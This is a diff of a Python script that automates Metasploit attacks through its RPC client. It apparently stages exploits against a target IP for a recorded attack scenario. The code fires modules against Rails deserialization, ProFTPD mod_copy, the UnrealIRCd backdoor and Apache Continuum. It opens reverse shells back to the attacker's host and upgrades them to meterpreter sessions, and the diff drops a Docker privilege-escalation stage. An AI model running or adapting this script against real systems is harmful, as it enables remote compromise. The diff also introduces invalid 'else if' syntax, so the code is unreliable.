@@ -17,7 +17,6 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
     AS = AttackScenario.objects().all().first()
@@ -30,43 +29,37 @@ def main(argv):
         exploit['TARGETURI'] = '/'
         exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
         payload['LPORT'] = 4444
-    elif(FS == "proftpd_modcopy_exec"):
+    else if(FS == "proftpd_modcopy_exec"):
         exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
         payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
         exploit[''] = '/'
         payload['LPORT'] = 4444
-    elif(FS == "unreal_ircd_3281_backdoor"):
+    else if(FS == "unreal_ircd_3281_backdoor"):
         exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
         payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
         exploit['RPORT'] = 6697
         payload['LPORT'] = 4444
-    elif(FS == "apache_continuum_cmd_exec"):
+    else if(FS == "apache_continuum_cmd_exec"):
         exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
         payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
         
     exploit['RHOSTS'] = target_ip
-    payload['LHOST'] = my_ip 
+    payload['LHOST'] = my_ip        
 
     output_time_file = 'time_stage_1_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
+    
 
     exploit.execute(payload=payload)
 
     while client.jobs.list:
         time.sleep(1)
 
-    if(FS == "rails_secret_deserialization" or FS == "proftpd_modcopy_exec"):
-        exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
-        exploit['SESSION'] = 1
-        exploit.execute()
-    elif(FS == "unreal_ircd_3281_backdoor" or FS == "apache_continuum_cmd_exec"):
-        exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
-        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-        exploit['SESSION'] = 1
-        payload['LHOST'] = my_ip
-        payload['LPORT'] = 4444
-        exploit.execute(payload=payload)
+
+    exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
+    exploit['SESSION'] = 1
+    exploit.execute()
 
     while client.jobs.list:
         time.sleep(1)
